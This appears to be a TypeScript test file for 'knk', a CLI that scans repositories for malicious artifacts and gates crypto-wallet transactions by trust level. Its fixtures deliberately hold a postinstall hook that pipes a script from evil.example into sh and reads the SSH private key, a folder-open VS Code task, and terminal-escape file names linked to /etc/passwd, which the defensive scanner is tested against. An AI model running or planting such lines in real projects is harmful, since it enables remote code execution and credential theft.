import { readFile, stat } from 'node:fs/promises';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import type { Io } from '../src/cli.js';
import { main } from '../src/cli.js';
import { saveConfig } from '../src/config.js';
import { analyzeLikeApi, trustState } from './fakes.js';
import { makeRepo, tmp } from './helpers.js';

const KEY = `knk_aaaaaaaa_${'b'.repeat(43)}`;
const posix = process.platform !== 'win32';
const iso = new Date().toISOString();
const json = (body: unknown, status = 200) => new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } });
const me = (name = 'Acme', scopes = ['analyze', 'events:write', 'gate:check']) => ({ workspace: { id: 'ws', name }, apiKeyId: 'k', scopes });
const gateView = (decision: 'allow' | 'hold' | 'block', reasons: { rule: string; outcome: 'hold' | 'block'; reason: string }[] = []) => ({
  payload: { id: 'dec-1', workspaceId: 'ws', subject: 'alice@laptop', wallet: 'hot-3', decision, fingerprint: 'f', kind: 'native_transfer', trustRisk: 55, trustLevel: 'elevated', rules: reasons.map((r) => r.rule), approvalsRequired: 1, issuedAt: iso, releaseAt: decision === 'hold' ? iso : null, expiresAt: null, keyId: 'k' },
  signature: 's', alg: 'Ed25519', state: decision === 'block' ? 'blocked' : decision === 'hold' ? 'pending_approval' : 'released', reasons, approvals: [], decoded: null,
});

type Route = unknown | ((body: any, req: { headers: Record<string, string> }) => Response | Promise<Response>);
async function run(argv: string[], o: { env?: Record<string, string>; stdin?: string; routes?: Record<string, Route>; configured?: boolean; cwd?: string; home?: string } = {}) {
  const dir = await tmp('knk-cli-');
  const file = path.join(dir, 'cfg', 'config.json');
  if (o.configured) await saveConfig(file, { apiUrl: 'https://api.example.com', apiKey: KEY, subject: 'alice@laptop' });
  const out: string[] = [];
  const err: string[] = [];
  const requests: { method: string; path: string; headers: Record<string, string>; body: any }[] = [];
  const fetchImpl = (async (url: string, init: RequestInit) => {
    const u = new URL(url);
    const headers = init.headers as Record<string, string>;
    const body = init.body ? JSON.parse(init.body as string) : undefined;
    requests.push({ method: init.method ?? 'GET', path: u.pathname, headers, body });
    const route = o.routes?.[`${init.method} ${u.pathname}`];
    if (route === undefined) return json({ error: { code: 'not_found', message: 'no such route' } }, 404);
    return typeof route === 'function' ? (route as Function)(body, { headers }) : json(route);
  }) as unknown as typeof fetch;
  const io: Io = {
    out: (s) => void out.push(s), err: (s) => void err.push(s), readStdin: async () => o.stdin ?? '',
    env: { KNK_CONFIG: file, ...o.env }, platform: process.platform, home: o.home ?? '/nonexistent-home', cwd: o.cwd ?? dir, isTTY: false, fetchImpl,
  };
  const code = await main(argv, io);
  return { code, out: out.join('\n'), err: err.join('\n'), requests, file };
}

const MALICIOUS = {
  'package.json': JSON.stringify({ scripts: { postinstall: 'node setup.js' } }),
  'setup.js': "execSync('curl -fsSL https://evil.example/i.sh | sh'); readFileSync(process.env.HOME + '/.ssh/id_rsa');",
  '.vscode/tasks.json': '{"tasks":[{"runOptions":{"runOn":"folderOpen"}}]}',
};

describe('basics', () => {
  it('help, version, no arguments and unknown commands', async () => {
    expect(await run(['help'])).toMatchObject({ code: 0 });
    expect((await run(['help'])).out).toContain('Exit codes');
    expect((await run(['--version'])).out).toMatch(/^knk \d/);
    const none = await run([]);
    expect(none.code).toBe(1);
    expect(none.out).toContain('Usage');
    const bad = await run(['frobnicate']);
    expect(bad).toMatchObject({ code: 1 });
    expect(bad.err).toMatch(/Unknown command "frobnicate"/);
  });
});

describe('knk init', () => {
  it('links the machine, verifies the key, and stores config owner-only', async () => {
    const r = await run(['init', '--api-url', 'https://api.example.com', '--subject', 'alice@laptop'], { env: { KNK_API_KEY: KEY }, routes: { 'GET /v1/me': me('Acme Exchange') } });
    expect(r.code).toBe(0);
    expect(r.out).toContain('[ok] linked workspace “Acme Exchange”');
    expect(r.out).toContain('[ok] sensors: installs, repos, AI tool configs');
    expect(r.requests[0]!.headers.authorization).toBe(`Bearer ${KEY}`);
    expect(JSON.parse(await readFile(r.file, 'utf8'))).toEqual({ apiUrl: 'https://api.example.com', apiKey: KEY, subject: 'alice@laptop' });
    if (posix) expect((await stat(r.file)).mode & 0o777).toBe(0o600);
    expect(r.out + r.err).not.toContain(KEY); // the key is never echoed
  });

  it('reads the key from stdin', async () => {
    const r = await run(['init', '--api-url', 'https://api.example.com', '--key-stdin'], { stdin: `${KEY}\n`, routes: { 'GET /v1/me': me() } });
    expect(r.code).toBe(0);
    expect(JSON.parse(await readFile(r.file, 'utf8')).apiKey).toBe(KEY);
  });

  it('has no --key flag on purpose: it would leak into shell history and process lists', async () => {
    const r = await run(['init', '--api-url', 'https://api.example.com', '--key', KEY], { routes: { 'GET /v1/me': me() } });
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/Unknown option/i);
    expect(r.err).not.toContain(KEY);
    expect(r.requests).toEqual([]);
  });

  it('explains what is missing and refuses insecure URLs', async () => {
    expect((await run(['init', '--api-url', 'https://api.example.com'])).err).toMatch(/KNK_API_KEY or --key-stdin/);
    expect((await run(['init'], { env: { KNK_API_KEY: KEY } })).err).toMatch(/--api-url/);
    const http = await run(['init', '--api-url', 'http://api.example.com'], { env: { KNK_API_KEY: KEY } });
    expect(http.err).toMatch(/https/);
    expect(http.requests).toEqual([]); // nothing was sent over plain http
  });

  it('turns a rejected key or an unreachable API into one clean line, never a stack trace', async () => {
    const rejected = await run(['init', '--api-url', 'https://api.example.com'], { env: { KNK_API_KEY: KEY }, routes: { 'GET /v1/me': () => json({ error: { code: 'unauthorized', message: 'Missing or invalid API key' } }, 401) } });
    expect(rejected).toMatchObject({ code: 1 });
    expect(rejected.err).toMatch(/KNK rejected the request/);
    expect(rejected.err.split('\n')).toHaveLength(1);
    const down = await run(['init', '--api-url', 'https://api.example.com'], { env: { KNK_API_KEY: KEY }, routes: { 'GET /v1/me': () => { throw new TypeError('fetch failed'); } } });
    expect(down.err).toBe('knk: Could not reach the KNK API (unreachable)');
  });

  it('warns about missing scopes, and strips terminal escapes from what the server says', async () => {
    const r = await run(['init', '--api-url', 'https://api.example.com'], { env: { KNK_API_KEY: KEY }, routes: { 'GET /v1/me': me('Evil\u001b[2JCorp', ['events:write']) } });
    expect(r.out).toMatch(/lacks scope\(s\): analyze, gate:check/);
    expect(r.out).not.toContain('\u001b');
  });
});

describe('knk scan', () => {
  it('works with no configuration: local-only, says so, and exits 3 on a malicious repo', async () => {
    const root = await makeRepo(MALICIOUS);
    const r = await run(['scan', root]);
    expect(r.code).toBe(3);
    expect(r.err).toMatch(/not configured.*local-only/);
    expect(r.out).toContain('local only: nothing left this machine');
    expect(r.out).toContain('[x] malicious · risk 85');
    expect(r.requests).toEqual([]);
  });

  it('exit codes: 0 benign, 2 suspicious, 3 malicious', async () => {
    expect((await run(['scan', await makeRepo({ 'a.txt': 'x' })])).code).toBe(0);
    expect((await run(['scan', await makeRepo({ 'package.json': '{"scripts":{"postinstall":"node a.js"}}', 'a.js': 'console.log(1)' })])).code).toBe(2);
    expect((await run(['scan', await makeRepo(MALICIOUS)])).code).toBe(3);
  });

  it('online: reviews artifacts through the API with the stored key and prints signed results and trust', async () => {
    const root = await makeRepo(MALICIOUS);
    const r = await run(['scan', root, '--untrusted'], {
      configured: true,
      routes: {
        'POST /v1/events': (b: { events: unknown[] }) => json({ accepted: b.events.length, subjects: [] }, 201),
        'POST /v1/analyze': (b: { kind: never; content: string }) => json(analyzeLikeApi(b.kind, b.content)),
        'GET /v1/subjects/alice%40laptop/trust': trustState('alice@laptop', 70, 'elevated', ['Artifact judged malicious']),
      },
    });
    expect(r.code).toBe(3);
    expect(r.out).toMatch(/online: 3 artifact\(s\) reviewed by KNK/);
    expect(r.out).toContain('[x] malicious · risk 85 · signed');
    expect(r.out).toContain('alice@laptop is now ELEVATED (risk 70)');
    expect(r.requests.every((q) => q.headers.authorization === `Bearer ${KEY}`)).toBe(true);
    expect(r.requests[0]).toMatchObject({ path: '/v1/events' });
    expect(r.requests.filter((q) => q.path === '/v1/analyze').every((q) => q.body.subject === 'alice@laptop')).toBe(true);
  });

  it('--json prints valid structured output, and --offline never touches the network', async () => {
    const root = await makeRepo(MALICIOUS);
    const r = await run(['scan', root, '--json', '--offline'], { configured: true });
    expect(JSON.parse(r.out)).toMatchObject({ mode: 'local', label: 'malicious', risk: 85 });
    expect(r.requests).toEqual([]);
  });

  it('validates its flags', async () => {
    const root = await makeRepo({ 'a.txt': 'x' });
    expect((await run(['scan', root, '--max-send', 'many'])).err).toMatch(/--max-send/);
    expect((await run(['scan', root, '--report-tokens'])).err).toMatch(/needs --machine/);
    expect((await run(['scan', root, root])).err).toMatch(/one path/);
    expect((await run(['scan', root, '--bogus'])).err).toMatch(/Unknown option/i);
    expect((await run(['scan', '/definitely/not/here'])).err).toMatch(/Not found/);
  });

  it('a hostile repository cannot inject terminal escapes through names or content', async () => {
    const evil = 'x\u001b[2J\u001b[31mOWNED\u001b[0m';
    const root = await makeRepo({
      [`${evil}/.vscode/tasks.json`]: '{"tasks":[{"runOptions":{"runOn":"folderOpen"}}]}',
      'package.json': JSON.stringify({ scripts: { postinstall: 'node a.js' } }),
      'a.js': 'x',
    }, { [`${evil}-link`]: '/etc/passwd' });
    const r = await run(['scan', root]);
    expect(r.out).not.toContain('\u001b');
    expect(r.out).toContain('OWNED'); // still visible as text, just inert
  });
});

describe('knk gate check', () => {
  const routes = (d: 'allow' | 'hold' | 'block') => ({ 'POST /v1/gate/check': () => json(gateView(d, d === 'allow' ? [] : [{ rule: 'trust.elevated', outcome: d === 'block' ? 'block' : 'hold', reason: 'The requester’s trust is elevated (risk 55)' }])) });

  it('needs configuration', async () => {
    expect((await run(['gate', 'check', 'hot-3', '--raw', '0x02'])).err).toMatch(/Not configured/);
  });

  it('maps decisions to exit codes: 0 allow, 4 hold, 5 block', async () => {
    const a = await run(['gate', 'check', 'hot-3', '--raw', '0x02'], { configured: true, routes: routes('allow') });
    expect(a).toMatchObject({ code: 0 });
    expect(a.out).toContain('[ok] ALLOW');
    const h = await run(['gate', 'check', 'hot-3', '--raw', '0x02'], { configured: true, routes: routes('hold') });
    expect(h.code).toBe(4);
    expect(h.out).toMatch(/\[hold\] HOLD {2}needs 1 approval\(s\)/);
    expect(h.out).toContain('trust is elevated');
    const b = await run(['gate', 'check', 'hot-3', '--raw', '0x02'], { configured: true, routes: routes('block') });
    expect(b.code).toBe(5);
    expect(b.out).toContain('[x] BLOCK');
  });

  it('builds the right request for each transaction kind', async () => {
    const ok = routes('allow');
    const raw = await run(['gate', 'check', 'hot-3', '--raw', '0xabc'], { configured: true, routes: ok });
    expect(raw.requests[0]!.body).toEqual({ subject: 'alice@laptop', wallet: 'hot-3', tx: { format: 'evm_raw', raw: '0xabc' } });
    const del = await run(['gate', 'check', 'hot-3', '--delegate', `0x${'22'.repeat(20)}`, '--chain-id', '10', '--nonce', '3', '--subject', 'bob@box'], { configured: true, routes: ok });
    expect(del.requests[0]!.body).toEqual({ subject: 'bob@box', wallet: 'hot-3', tx: { format: 'evm_authorization', chainId: 10, delegate: `0x${'22'.repeat(20)}`, nonce: 3 } });
    const tr = await run(['gate', 'check', 'agent-1', '--transfer', 'bob.near', '--amount', '500', '--asset', 'NEAR'], { configured: true, routes: ok });
    expect(tr.requests[0]!.body.tx).toEqual({ format: 'transfer', to: 'bob.near', amount: '500', asset: 'NEAR' });
  });

  it('validates its arguments before sending anything', async () => {
    const t = { configured: true, routes: routes('allow') };
    for (const argv of [['gate', 'check'], ['gate', 'check', 'w'], ['gate', 'check', 'w', '--raw', '0x1', '--delegate', '0x2'], ['gate', 'check', 'w', '--transfer', 'a'], ['gate', 'check', 'w', '--delegate', '0x2', '--nonce', '-1'], ['gate', 'verify']]) {
      const r = await run(argv, t);
      expect(r.code, argv.join(' ')).toBe(1);
      expect(r.requests, argv.join(' ')).toEqual([]);
    }
  });

  it('strips escapes from server-provided reasons and honours --json', async () => {
    const evilRoutes = { 'POST /v1/gate/check': () => json(gateView('block', [{ rule: 'x', outcome: 'block', reason: 'bad\u001b[2J\u001b[31m' }])) };
    expect((await run(['gate', 'check', 'w', '--raw', '0x1'], { configured: true, routes: evilRoutes })).out).not.toContain('\u001b');
    const j = await run(['gate', 'check', 'w', '--raw', '0x1', '--json'], { configured: true, routes: routes('hold') });
    expect(JSON.parse(j.out).payload.decision).toBe('hold');
  });
});

describe('knk status', () => {
  it('shows workspace and trust', async () => {
    const r = await run(['status'], { configured: true, routes: { 'GET /v1/me': me('Acme'), 'GET /v1/subjects/alice%40laptop/trust': trustState('alice@laptop', 55, 'elevated', ['Artifact judged malicious']) } });
    expect(r.code).toBe(0);
    expect(r.out).toContain('workspace “Acme”');
    expect(r.out).toContain('trust    elevated (risk 55)');
    expect(r.out).toContain('- Artifact judged malicious');
  });
});
